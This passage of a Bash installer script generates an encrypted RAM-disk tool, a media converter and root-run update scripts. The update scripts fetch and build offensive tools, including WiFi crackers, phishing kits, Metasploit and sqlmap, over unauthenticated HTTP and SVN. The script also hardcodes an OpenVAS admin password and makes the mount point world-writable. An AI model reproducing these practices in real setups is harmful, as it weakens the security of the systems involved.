	dd if=harrypotterURAND of=harrypotterRAMDISK/cryptainer bs=1M count=harrypotterSIZEMB 1> /dev/null 2> /dev/null # creating a file container and mounting it

	echo £+[*] Mountig Loop Device ... £+
	loop=harrypotter(sudo losetup -f | head -n 1) # finding the first loop device
	losetup harrypotterloop harrypotterRAMDISK/cryptainer  1> /dev/null 2> /dev/null # mount loop device to ramdisk

	echo £+[*] Cryptation ... £+
	cryptsetup create --cipher aes-xts-plain --key-size 512 harrypotterCRYPT harrypotterloop -d harrypotterURAND 1> /dev/null 2> /dev/null # criptazione con algoritmo AES-XTS e con chiave da 512b causale da /dev/urandom
	badblocks -swt random harrypotterMAPPER/harrypotterCRYPT 1> /dev/null 2> /dev/null # enhance entropy

	echo £+[*] Mounting ... £+
	mkfs.ext2 harrypotterMAPPER/harrypotterCRYPT # create filesystem
	mkdir /media/harrypotterCRYPT # create MountPoint
	mount harrypotterMAPPER/harrypotterCRYPT /mnt/harrypotterCRYPT # Mount RamDisk

	chmod 777 /media/harrypotterCRYPT # permission to non root users to /read/write/execute

	cd /media/harrypotterCRYPT

	rm -rf ./lost+found

	clear

	echo £+/media/harrypotterCRYPT was created with success !!!!!£+

	A=2
	until [ harrypotterA == £+0£+ ] || [ harrypotterA == £+1£+ ]; do
		echo £+£+
		echo £+Now Press 0 If You Wanna Close The Programm£+
		echo £+Or Wait Until You Wanna Delete The Crypted RamDisk, And Press 1£+
		echo £+£+
		echo -n £+Choice : £+
		read A
	done

	if [ harrypotterA == £+0£+ ]; then
		exit 0
	fi

	if [ harrypotterA == £+1£+ ]; then
		umount /media/harrypotterCRIPT # unmount the cryptdisk
		cryptsetup remove harrypotterCRYPT # remove the cryptdisk
		losetup -d harrypotterloop # unmount the loop device
		shred -ufv harrypotterRAMDISK/cryptainer # overwrite the cryptainer
		umount harrypotterRAMDISK # unmount the ramdisk
		rm -fr harrypotterRAMDISK # delete the ramdisk
		clear
		echo £+/mnt/harrypotterCRYPT eliminato !!!!!£+
		exit 0
	fi

}

f_ramdisk_delete () {

	clear

	echo -n £+Inserisci Il Nome Del RamDisk Da Eliminare (es: CRYPTDISK) : £+
	read CRYPT

	umount /mnt/harrypotterCRIPT # unmount the cryptdisk
	cryptsetup remove harrypotterCRYPT # remove the cryptdisk
	losetup -d harrypotterloop # unmount the loop device
	shred -ufv harrypotterRAMDISK/cryptainer # overwrite the cryptainer
	umount harrypotterRAMDISK # unmount the ramdisk
	rm -fr harrypotterRAMDISK # delete the ramdisk

	clear

	echo £+harrypotterCRYPT eliminato !!!!!£+

	exit 0
}

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

rmdcreate=1
rmddelete=2
rmdcho=3
until [ harrypotterrmdcho == harrypotterrmdcreate ] || [ harrypotterrmdcho == harrypotterrmddelete ]; do
	clear
	echo £+This Script Let You Word With Crypted RamDisk£+
	echo £+£+
	echo £+Select Operation : £+
	echo £+£+
	echo £+1) Create A RamDisk£+
	echo £+2) Delete An Esisting RamDisk£+
	echo £+£+
	echo -n £+Choice : £+
	read rmdcho
done

case harrypotterrmdcho in

1) f_ramdisk_create ;;

2) f_ramdisk_delete ;;

esac

" | sed -e 's/harrypotter/$/g' |sed -e 's/£+/"/g' >> ramdisk.sh

}

f_writing_ramdisk

ln -sf /opt/darkeffe/ramdisk.sh /usr/local/bin/ramdisk 1> /dev/null

cd $HOME

}

f_ramdisk

f_update () {

echo "  [*] Update"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f update.sh 1> /dev/null
touch update.sh 1> /dev/null

f_writing_update () {

echo "#!/bin/bash

clear

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

f_up () {

apt-get update
apt-get upgrade -y --force-yes
apt-get dist-upgrade -y --force-yes
apt-get clean
apt-get autoclean
apt-get autoremove --purge -y --force-yes

}

( f_up ) &

f_tint2 () {

cd /opt
svn update http://tint2.googlecode.com/svn/trunk/ tint2-read-only
cd tint2-read-only
mkdir build
cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr ../
make
make install
cd $HOME

}

( f_tint2 ) &

f_amsn () {
cd /opt
rm -fr amsn
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn amsn
cd amsn
axel http://nice.freedesktop.org/releases/libnice-0.0.6.tar.gz
tar xzvf libnice-0.0.6.tar.gz
cd libnice-0.0.6
./configure --prefix=/usr --disable-gtk-doc
make
make install
axel http://farsight.freedesktop.org/releases/farsight2/farsight2-0.0.7.tar.gz
tar xzvf farsight2-0.0.7.tar.gz
cd farsight2-0.0.7
./configure --prefix=/usr --disable-python --disable-gtk-doc
make
make install
cd ..
make clean
make uninstall
./configure
make
make install
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn-extras amsn-extras
cd amsn-extras
mkdir -p $HOME/.amsn
cp -r ./* $HOME/.amsn/
cd ..
cvs -z3 -d:pserver:anonymous@tkdnd.cvs.sourceforge.net:/cvsroot/tkdnd co -P tkdnd/lib
cd tkdnd
mkdir -p /usr/share/amsn/utils/tkdnd
cp lib/*tcl /usr/share/amsn/utils/tkdnd/
cp lib/Linux/libtkdnd1.0.so /usr/share/amsn/utils/tkdnd/
cd ..
cd /usr/local/bin
ln -s wish8.5 wish
ln -s tclsh8.5 tclsh
cd $HOME

}

f_amsn

f_uniofuzz () { # python

cd /pentest/uniofuzz
rm -f uniofuzz.py
axel http://www.nullsecurity.net/tools/uniofuzz.py 1> /dev/null
cd $HOME

}

( f_uniofuzz ) &


# HandBrake
f_handbrake () { # subversion build-essential yasm autoconf libtool zlib1g-dev libbz2-dev intltool libglib2.0-dev libdbus-glib-1-dev libgtk2.0-dev libgudev-1.0-dev libwebkit-dev libnotify-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev

cd /opt
echo £+[*] Installing HandBrake ...£+
echo £+    - Downloading Subversion Source Code ...£+
svn checkout svn://svn.handbrake.fr/HandBrake/trunk hb-trunk 1> /dev/null
cd hb-trunk
echo £+    - Configuring ...£+
./configure 1> /dev/null
cd build
echo £+    - Installing ...£+
make 1> /dev/null
make install 1> /dev/null
cd ..
cd ..
rm -fr hb-trunk

cd $HOME

}

( f_handbrake ) &

f_aircrack_ng () {

cd /pentest
rm -fr aircrack-ng
svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng
cd aircrack-ng
make sqlite=true unstable=true
make sqlite=true unstable=true install
cd ..
cd $HOME

}

f_aircrack_ng

f_pyrit () {

cd /pentest
svn co http://pyrit.googlecode.com/svn/trunk/ pyrit_svn
cd pyrit_svn
cd pyrit
python setup.py build
python setup.py install
cd ..
cd $HOME
cd $HOME/.pyrit
rm -f config
touch config
echo £+default_storage = sqlite:///pyrit.db£+ >> config
echo £+limit_ncpus = 0£+ >> config
echo £+rpc_announce = true£+ >> config
echo £+rpc_announce_broadcast£+ = false >> config
echo £+rpc_knownclients =£+ >> config
echo £+rpc_server = false£+ >> config
echo £+workunit_size = 75000£+ >> config
cd $HOME


}

( f_pyrit ) &

f_airoscript () {

cd /pentest
rm -fr airoscript-ng
svn co http://trac.aircrack-ng.org/svn/branch/airoscript-ng/ airoscript-ng
cd airoscript-ng
make
cd ..
cd $HOME

}

( f_airoscript ) &

f_hexor_base () {

cd /pentest
mkdir -p Database

cd Database

rm -f hexorbase
svn checkout http://hexorbase.googlecode.com/svn/HexorBase/ hexorbase

cd $HOME

}

f_hexor_base

f_sqlmap () {

cd /pentest

mkdir -p Database

cd Database

rm -fr sqlmap

svn co https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap

cd $HOME

}

( f_sqlmap ) &

f_fern_wifi_cracker () {

cd /pentest

rm -f Fern-Wifi-Cracker

svn checkout http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/

cd $HOME

}

f_fern_wifi_cracker

f_metasploit () {

cd /pentest
svn co http://metasploit.com/svn/framework3/trunk/ metasploit
cd $HOME
msfupdate


}

( f_metasploit ) &

f_set () {

cd /pentest
rm -f set
svn co http://svn.secmaniac.com/social_engineering_toolkit set/
cd $HOME

}

f_set

f_ghost_phisher () {

cd /pentest

rm -fr Ghost-Phisher

svn checkout http://ghost-phisher.googlecode.com/svn/Ghost-Phisher

cd $HOME

}

(f_ghost_phisher ) &

f_openvas () {

cd /pentest
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-libraries
cd openvas-libraries
./configure
make
make install
cd ..
rm -fr openvas-libraries
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-scanner
cd openvas-scanner
./configure
make
make install
cd ..
rm -fr openvas-scanner
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-manager
cd openvas-manager
./configure
make
make install
cd ..
rm -fr openvas-manager
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-administrator
cd openvas-administrator
./configure
make
make install
cd ..
rm -fr openvas-administrator
openvas-mkcert  # Certificates Creation
openvas-nvt-sync  # Sincronisation Network Vulnerability Tests
openvasad -c add_user --name=darkeffe --password=darkefferulez --role=Admin  # Creating User With Administrator Rank
openvas-mkcert-client -n darkeffe -i  # linking User £+darkeffe£+ With Certificates [Creating The Key]
openvassd  # Start Openvas Scanner
openvasmd --rebuild  # Initialise The Database
kill all openvassd
cd $HOME
rm -f omp.config
touch omp.config
echo £+[Connection]£+ >> omp.config
echo £+host=localhost£+ >> omp.config
echo £+port=9390£+ >> omp.config
echo £+username=darkeffe£+ >> omp.config
echo £+password=darkeffe£+ >> omp.config
cd $HOME

}

( f_openvas ) &

f_wifite () { # aircrack-ng cowpatty pyrit

cd /pentest

rm -f wifite.py

wget -O wifite.py http://wifite.googlecode.com/svn/trunk/wifite.py

cd $HOME

}

( f_wifite ) &

f_w3af () {

cd /pentest

rm -f w3af

svn co https://w3af.svn.sourceforge.net/svnroot/w3af/trunk w3af

cd $HOME

}

f_w3af

f_netdiscover () {
cd /pentest
svn co https://netdiscover.svn.sourceforge.net/svnroot/netdiscover/trunk netdiscover 1> /dev/null 2> $LOG
cd netdiscover
./autogen.sh 1> /dev/null
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr netdiscover
cd $HOME

}

( f_netdiscover ) &

f_nmap () {
cd /pentest
svn co --username guest --password £+£+ svn://svn.insecure.org/nmap/.
cd nmap
./configure
make
make install
cd ..
rm -fr nmap
cd $HOME

}

f_nmap

f_nikto () {

cd /pentest

rm -fr nikto

svn co http://svn2.assembla.com/svn/Nikto_2/trunk/ nikto

cd $HOME

}

f_nikto

f_creepy () {

cd /pentest

rm -fr creepy

git clone git://github.com/ilektrojohn/creepy

cd $HOME

}

f_creepy

perl /pentest/nikto/nikto.pl -update

" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> update.sh

}

f_writing_update

cd $HOME

}

f_update

f_update_nvidia () {

echo "  [*] Update Nvidia"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f update-nvidia.sh 1> /dev/null
touch update-nvidia.sh 1> /dev/null

f_writing_update_nvidia () {

echo "#!/bin/bash

clear

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

f_up () {

apt-get update
apt-get upgrade -y --force-yes
apt-get dist-upgrade -y --force-yes
apt-get clean
apt-get autoclean
apt-get autoremove --purge -y --force-yes

}

( f_up ) &

f_tint2 () {
cd /opt
rm -fr tint2-read-only
svn co http://tint2.googlecode.com/svn/trunk/ tint2-read-only
cd tint2-read-only
mkdir build
cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr ../
make
make install
cd $HOME

}

( f_tint2 ) &

f_amsn () {
cd /opt
rm -fr amsn
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn amsn
cd amsn
axel http://nice.freedesktop.org/releases/libnice-0.0.6.tar.gz
tar xzvf libnice-0.0.6.tar.gz
cd libnice-0.0.6
./configure --prefix=/usr --disable-gtk-doc
make
make install
axel http://farsight.freedesktop.org/releases/farsight2/farsight2-0.0.7.tar.gz
tar xzvf farsight2-0.0.7.tar.gz
cd farsight2-0.0.7
./configure --prefix=/usr --disable-python --disable-gtk-doc
make
make install
cd ..
rm -f farsight2-0.0.7.tar.gz
make clean
make uninstall
./configure
make
make install
rm -fr amsn-extras
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn-extras amsn-extras
cd amsn-extras
mkdir -p $HOME/.amsn
cp -r ./* $HOME/.amsn/
cd ..
cvs -z3 -d:pserver:anonymous@tkdnd.cvs.sourceforge.net:/cvsroot/tkdnd co -P tkdnd/lib
cd tkdnd
mkdir -p /usr/share/amsn/utils/tkdnd
cp lib/*tcl /usr/share/amsn/utils/tkdnd/
cp lib/Linux/libtkdnd1.0.so /usr/share/amsn/utils/tkdnd/
cd ..
cd /usr/local/bin
ln -s wish8.5 wish
ln -s tclsh8.5 tclsh
cd $HOME

}

f_amsn

f_uniofuzz () { # python

cd /pentest/uniofuzz
rm -f uniofuzz.py
axel http://www.nullsecurity.net/tools/uniofuzz.py 1> /dev/null
cd $HOME

}

( f_uniofuzz ) &


# HandBrake
f_handbrake () { # subversion build-essential yasm autoconf libtool zlib1g-dev libbz2-dev intltool libglib2.0-dev libdbus-glib-1-dev libgtk2.0-dev libgudev-1.0-dev libwebkit-dev libnotify-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev

cd /opt
echo £+[*] Installing HandBrake ...£+
echo £+    - Downloading Subversion Source Code ...£+
svn checkout svn://svn.handbrake.fr/HandBrake/trunk hb-trunk 1> /dev/null
cd hb-trunk
echo £+    - Configuring ...£+
./configure 1> /dev/null
cd build
echo £+    - Installing ...£+
make 1> /dev/null
make install 1> /dev/null
cd ..
cd ..
rm -fr hb-trunk

cd $HOME

}

( f_handbrake ) &

f_aircrack_ng_cuda () {

cd /pentest
rm -fr aircrack-ng-cuda
svn co http://trac.aircrack-ng.org/svn/branch/aircrack-ng-cuda aircrack-ng-cuda
cd aircrack-ng-cuda
make CUDA=true sqlite=true unstable=true
make CUDA=true sqlite=true unstable=true install
cd ..
cd $HOME

}

( f_aircrack_ng_cuda ) &

f_pyrit_cuda () {

cd /pentest
rm -fr pyrit_svn
svn co http://pyrit.googlecode.com/svn/trunk/ pyrit_svn
cd pyrit_svn
cd pyrit
python setup.py build
python setup.py install
cd ..
cd $HOME
cd $HOME/.pyrit
rm -f config
touch config
echo £+default_storage = sqlite:///pyrit.db£+ >> config
echo £+limit_ncpus = 0£+ >> config
echo £+rpc_announce = true£+ >> config
echo £+rpc_announce_broadcast£+ = false >> config
echo £+rpc_knownclients =£+ >> config
echo £+rpc_server = false£+ >> config
echo £+workunit_size = 75000£+ >> config
cd $HOME
cd /pentest/pyrit_svn
cd cpyrit_cuda
python setup.py build
python setup.py install
cd ..
cd $HOME

}

f_pyrit_cuda

f_airoscript () {

cd /pentest
rm -fr airoscript-ng
svn co http://trac.aircrack-ng.org/svn/branch/airoscript-ng/ airoscript-ng
cd airoscript-ng
make
cd ..
cd $HOME

}

( f_airoscript ) &

f_hexor_base () {

cd /pentest
mkdir -p Database

cd Database

rm -f hexorbase
svn checkout http://hexorbase.googlecode.com/svn/HexorBase/ hexorbase

cd $HOME

}

f_hexor_base

f_sqlmap () {

cd /pentest

mkdir -p Database

cd Database

rm -fr sqlmap

svn co https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap

cd $HOME

}

( f_sqlmap ) &

f_metasploit () {

cd /pentest
rm -fr metasploit
svn co http://metasploit.com/svn/framework3/trunk/ metasploit
cd $HOME
msfupdate

}

f_fern_wifi_cracker () {

cd /pentest

rm -f Fern-Wifi-Cracker

svn checkout http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/

cd $HOME

}

f_fern_wifi_cracker

( f_metasploit ) &

f_set () {

cd /pentest
rm -f set
svn co http://svn.secmaniac.com/social_engineering_toolkit set/
cd $HOME

}

f_set

f_ghost_phisher () {

cd /pentest

rm -fr Ghost-Phisher

svn checkout http://ghost-phisher.googlecode.com/svn/Ghost-Phisher

cd $HOME

}

(f_ghost_phisher ) &

f_openvas () {

cd /pentest
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-libraries
cd openvas-libraries
./configure
make
make install
cd ..
rm -fr openvas-libraries
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-scanner
cd openvas-scanner
./configure
make
make install
cd ..
rm -fr openvas-scanner
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-manager
cd openvas-manager
./configure
make
make install
cd ..
rm -fr openvas-manager
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-administrator
cd openvas-administrator
./configure
make
make install
cd ..
rm -fr openvas-administrator
openvas-mkcert  # Certificates Creation
openvas-nvt-sync  # Sincronisation Network Vulnerability Tests
openvasad -c add_user --name=darkeffe --password=darkefferulez --role=Admin  # Creating User With Administrator Rank
openvas-mkcert-client -n darkeffe -i  # linking User £+darkeffe£+ With Certificates [Creating The Key]
openvassd  # Start Openvas Scanner
openvasmd --rebuild  # Initialise The Database
kill all openvassd
cd $HOME
rm -f omp.config
touch omp.config
echo £+[Connection]£+ >> omp.config
echo £+host=localhost£+ >> omp.config
echo £+port=9390£+ >> omp.config
echo £+username=darkeffe£+ >> omp.config
echo £+password=darkeffe£+ >> omp.config
cd $HOME

}

f_openvas

f_wifite () { # aircrack-ng cowpatty pyrit

cd /pentest

rm -f wifite.py

wget -O wifite.py http://wifite.googlecode.com/svn/trunk/wifite.py

cd $HOME

}

( f_wifite ) &

f_w3af () {

cd /pentest

svn co https://w3af.svn.sourceforge.net/svnroot/w3af/trunk w3af

cd $HOME

}

f_w3af

f_netdiscover () {
cd /pentest
svn co https://netdiscover.svn.sourceforge.net/svnroot/netdiscover/trunk netdiscover 1> /dev/null 2> $LOG
cd netdiscover
./autogen.sh 1> /dev/null
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr netdiscover
cd $HOME

}

f_netdiscover

f_nmap () {

cd /pentest
rm -fr nmap
svn co --username guest --password £+£+ svn://svn.insecure.org/nmap/.
cd nmap
./configure
make
make install
cd ..
rm -fr nmap
cd $HOME

}

f_nmap

f_nikto () {

cd /pentest

rm -fr nikto

svn co http://svn2.assembla.com/svn/Nikto_2/trunk/ nikto

cd $HOME

}

f_nikto

f_creepy () {

cd /pentest

rm -fr creepy

git clone git://github.com/ilektrojohn/creepy

cd $HOME

}

f_creepy

perl /pentest/nikto/nikto.pl -update

exit 0

" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> update-nvidia.sh

}

f_writing_update_nvidia

cd $HOME

}

f_update_nvidia

f_update_ati () {

echo "  [*] Update Ati"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f update-ati.sh 1> /dev/null
touch update-ati.sh 1> /dev/null

f_writing_update_ati () {

echo "#!/bin/bash

clear

if [ £+harrypotter(id -u)£+ != £+0£+ ]; then
   echo £+This script must be run as root£+ 1>&2
   exit 1
fi

f_up () {

apt-get update
apt-get upgrade -y --force-yes
apt-get dist-upgrade -y --force-yes
apt-get clean
apt-get autoclean
apt-get autoremove --purge -y --force-yes

}

( f_up ) &

f_tint2 () {
cd /opt
rm -fr tint2-read-only
svn update http://tint2.googlecode.com/svn/trunk/ tint2-read-only
cd tint2-read-only
mkdir build
cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr ../
make
make install
cd $HOME

}

( f_tint2 ) &

f_amsn () {
cd /opt
rm -fr amsn
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn amsn
cd amsn
axel http://nice.freedesktop.org/releases/libnice-0.0.6.tar.gz
tar xzvf libnice-0.0.6.tar.gz
cd libnice-0.0.6
./configure --prefix=/usr --disable-gtk-doc
make
make install
axel http://farsight.freedesktop.org/releases/farsight2/farsight2-0.0.7.tar.gz
tar xzvf farsight2-0.0.7.tar.gz
cd farsight2-0.0.7
./configure --prefix=/usr --disable-python --disable-gtk-doc
make
make install
cd ..
rm -f farsight2-0.0.7.tar.gz
make clean
make uninstall
./configure
make
make install
rm -fr amsn-extras
svn co https://amsn.svn.sourceforge.net/svnroot/amsn/trunk/amsn-extras amsn-extras
cd amsn-extras
mkdir -p $HOME/.amsn
cp -r ./* $HOME/.amsn/
cd ..
cvs -z3 -d:pserver:anonymous@tkdnd.cvs.sourceforge.net:/cvsroot/tkdnd co -P tkdnd/lib
cd tkdnd
mkdir -p /usr/share/amsn/utils/tkdnd
cp lib/*tcl /usr/share/amsn/utils/tkdnd/
cp lib/Linux/libtkdnd1.0.so /usr/share/amsn/utils/tkdnd/
cd ..
cd /usr/local/bin
ln -s wish8.5 wish
ln -s tclsh8.5 tclsh
cd $HOME

}

f_amsn

f_uniofuzz () { # python

cd /pentest/uniofuzz
rm -f uniofuzz.py
axel http://www.nullsecurity.net/tools/uniofuzz.py 1> /dev/null
cd $HOME

}

( f_uniofuzz ) &


# HandBrake
f_handbrake () { # subversion build-essential yasm autoconf libtool zlib1g-dev libbz2-dev intltool libglib2.0-dev libdbus-glib-1-dev libgtk2.0-dev libgudev-1.0-dev libwebkit-dev libnotify-dev libgstreamer0.10-dev libgstreamer-plugins-base0.10-dev

cd /opt
echo £+[*] Installing HandBrake ...£+
echo £+    - Downloading Subversion Source Code ...£+
svn checkout svn://svn.handbrake.fr/HandBrake/trunk hb-trunk 1> /dev/null
cd hb-trunk
echo £+    - Configuring ...£+
./configure 1> /dev/null
cd build
echo £+    - Installing ...£+
make 1> /dev/null
make install 1> /dev/null
cd ..
cd ..
rm -fr hb-trunk

cd $HOME

}

( f_handbrake ) &

f_aircrack_ng () {

cd /pentest
rm -fr aircrack-ng
svn co http://trac.aircrack-ng.org/svn/trunk aircrack-ng
cd aircrack-ng
make sqlite=true unstable=true
make sqlite=true unstable=true install
cd ..
cd $HOME

}

f_aircrack_ng


f_pyrit_callpp () {

cd /pentest
rm -fr pyrit_svn
svn co http://pyrit.googlecode.com/svn/trunk/ pyrit_svn
cd pyrit_svn
cd pyrit
python setup.py build
python setup.py install
cd ..
cd $HOME
cd $HOME/.pyrit
rm -f config
touch config
echo £+default_storage = sqlite:///pyrit.db£+ >> config
echo £+limit_ncpus = 0£+ >> config
echo £+rpc_announce = true£+ >> config
echo £+rpc_announce_broadcast£+ = false >> config
echo £+rpc_knownclients =£+ >> config
echo £+rpc_server = false£+ >> config
echo £+workunit_size = 75000£+ >> config
cd $HOME
cd /pentest/pyrit_svn/cpyrit_calpp
python setup.py build
python setup.py install
cd $HOME

}

( f_pyrit_callpp ) &


f_airoscript () {

cd /pentest
rm -fr airoscript-ng
svn co http://trac.aircrack-ng.org/svn/branch/airoscript-ng/ airoscript-ng
cd airoscript-ng
make
cd ..
cd $HOME

}

( f_airoscript ) &

f_hexor_base () {

cd /pentest
mkdir -p Database

cd Database

rm -fr hexorbase
svn checkout http://hexorbase.googlecode.com/svn/HexorBase/ hexorbase

cd $HOME

}

f_hexor_base

f_sqlmap () {

cd /pentest

mkdir -p Database

cd Database

rm -fr sqlmap

svn co https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap

cd $HOME

}

( f_sqlmap ) &

f_fern_wifi_cracker () {

cd /pentest

rm -f Fern-Wifi-Cracker

svn checkout http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/

cd $HOME

}

f_fern_wifi_cracker

f_metasploit () {

cd /pentest
rm -fr metasploit
svn co http://metasploit.com/svn/framework3/trunk/ metasploit
cd $HOME
msfupdate

}

( f_metasploit ) &

f_set () {

cd /pentest

rm -f set

svn co http://svn.secmaniac.com/social_engineering_toolkit set/

cd $HOME

}

f_set

f_ghost_phisher () {

cd /pentest

rm -fr Ghost-Phisher

svn checkout http://ghost-phisher.googlecode.com/svn/Ghost-Phisher

cd $HOME

}

(f_ghost_phisher ) &

f_openvas () {

cd /pentest
mkdir -p Openvas
cd Openvas
apt-get install -y --force-yes build-essential libqt4-sql gnutls-bin gnutls-dev glib-2.0 cmake libxml++ libmicrohttpd5 pkg-config xsltproc e2fsprogs sqlite3 libglib2.0-0 libgnutls26 libpcap-ruby libpcapnav0 libgpgme++ rpm alien fakeroot xsltproc
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-libraries
cd openvas-libraries
./configure
make
make install
cd ..
rm -fr openvas-libraries
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-scanner
cd openvas-scanner
./configure
make
make install
cd ..
rm -fr openvas-scanner
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-manager
cd openvas-manager
./configure
make
make install
cd ..
rm -fr openvas-manager
svn checkout https://svn.wald.intevation.org/svn/openvas/trunk/openvas-administrator
cd openvas-administrator
./configure
make
make install
cd ..
rm -fr openvas-administrator
openvas-mkcert  # Certificates Creation
openvas-nvt-sync  # Sincronisation Network Vulnerability Tests
openvasad -c add_user --name=darkeffe --password=darkefferulez --role=Admin  # Creating User With Administrator Rank
openvas-mkcert-client -n darkeffe -i  # linking User £+darkeffe£+ With Certificates [Creating The Key]
openvassd  # Start Openvas Scanner
openvasmd --rebuild  # Initialise The Database
kill all openvassd
cd $HOME
rm -f omp.config
touch omp.config
echo £+[Connection]£+ >> omp.config
echo £+host=localhost£+ >> omp.config
echo £+port=9390£+ >> omp.config
echo £+username=darkeffe£+ >> omp.config
echo £+password=darkeffe£+ >> omp.config
cd $HOME

}

f_openvas

f_wifite () { # aircrack-ng cowpatty pyrit

cd /pentest

rm -f wifite.py

wget -O wifite.py http://wifite.googlecode.com/svn/trunk/wifite.py

cd $HOME

}

( f_wifite ) &

f_w3af () {

cd /pentest

svn co https://w3af.svn.sourceforge.net/svnroot/w3af/trunk w3af  1> /dev/null

cd $HOME

}

f_w3af

f_netdiscover () {
cd /pentest
svn co https://netdiscover.svn.sourceforge.net/svnroot/netdiscover/trunk netdiscover 1> /dev/null 2> $LOG
cd netdiscover
./autogen.sh 1> /dev/null
./configure 1> /dev/null
make 1> /dev/null
make install 1> /dev/null
cd ..
rm -fr netdiscover
cd $HOME

}

f_netdiscover

f_nmap () {

cd /pentest
svn co --username guest --password £+£+ svn://svn.insecure.org/nmap/.
cd nmap
./configure
make
make install
cd ..
rm -fr nmap
cd $HOME

}

f_nmap

f_nikto () {

cd /pentest

rm -fr nikto

svn co http://svn2.assembla.com/svn/Nikto_2/trunk/ nikto

cd $HOME

}

f_nikto

f_nikto

f_creepy () {

cd /pentest

rm -fr creepy

git clone git://github.com/ilektrojohn/creepy

cd $HOME

}

f_creepy

perl /pentest/nikto/nikto.pl -update

exit 0

" | sed -e 's/£+/"/g' | sed -e 's/harrypotter/$/g' >> update-ati.sh

}

f_writing_update_ati

cd $HOME

}

f_update_ati

f_videoaudioconverter () {

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f videoaudioconv.sh 1> /dev/null
touch videoaudioconv.sh 1> /dev/null

f_writing_videoaudioconverter () {

echo "#!/bin/bash

f_video () {

clear

echo -en £+Write the Video file path (es: /home/user/Video/video.mp4) : £+
read input

clear

echo -en £+Write the output path (es: /home/user/output [ No extension ]) : £+
read output

clear

echo -en £+Write the output files extension (es : avi ) : £+
read ext

clear

echo £+[*] Converting ...£+
ffmpeg -i harrypotterinput -f harrypotterext -ab 192000 -sameq harrypotteroutput.harrypotterext 1> /dev/null 2> /dev/null

echo £+#############################################£+
echo
echo £+The file Has Been Converted, you will find it in harrypotteroutput.harrypotterext £+

exit 0

}

f_audio () {

clear

echo -en £+Write the Audio file path (es: /home/user/Music/music.mp3) : £+
read input

clear

echo -en £+Write the output path (es: /home/user/output [ No extension ]) : £+
read output

clear

echo -en £+Write the output files extension (es : acc ) : £+
read ext

clear

echo £+[*] Converting ...£+

ffmpeg -i harrypotterinput -f harrypotterext -ab 192000 -vn harrypotteroutput.harrypotterext 1> /dev/null 2> /dev/null

echo £+#############################################£+
echo
echo £+The file Has Been Converted, you will find it in harrypotteroutput.harrypotterext £+

exit 0

}

f_videoaudio () {

clear

echo -en £+Write the Video file path (es: /home/user/Video/video.mp4) : £+
read input

clear

echo -en £+Write the output path (es: /home/user/output [ No extension ]) : £+
read output

clear

echo -en £+Write the output files extension (es : mp3 ) : £+
read ext

clear

echo £+[*] Converting ...£+
ffmpeg -i harrypotterinput -f harrypotterext -ab 192000 -vn harrypotteroutput.harrypotterext 1> /dev/null 2> /dev/null

echo £+#############################################£+
echo
echo £+The Audio Has Been Extracted, you will find it in harrypotteroutput.harrypotterext £+

exit 0

}

f_menu () {

convert=0
video=1
audio=2
videoaudio=3
until [ harrypotterconvert == harrypottervideo ] || [ harrypotterconvert == harrypottervideo ] || [ harrypotterconvert == harrypotteraudio ] || [ harrypotterconvert == harrypottervideoaudio ]; do
	clear
	echo £+ This Program Uses Ffmpeg to converts multimedial files or to extract the audio : £+
	echo
	echo £+1) Converti Un File Video In Un Altro Formato£+
	echo £+2) Converti Un File Audio In Un Altro Formato£+
	echo £+3) Estrai LAudio Da Un File Video£+
	echo
	echo -en £+Seleziona lopzione desiderata : £+
	read convert
done

if [ harrypotterconvert == harrypottervideo ]; then
	f_video
fi
if [ harrypotterconvert == harrypotteraudio ]; then
	f_audio
fi
if [ harrypotterconvert == harrypottervideoaudio ]; then
	f_videoaudio
fi

}

f_menu

" | sed -e 's/harrypotter/$/g'  | sed -e 's/£+/"/g' >> videoaudioconv.sh

}

f_writing_videoaudioconverter

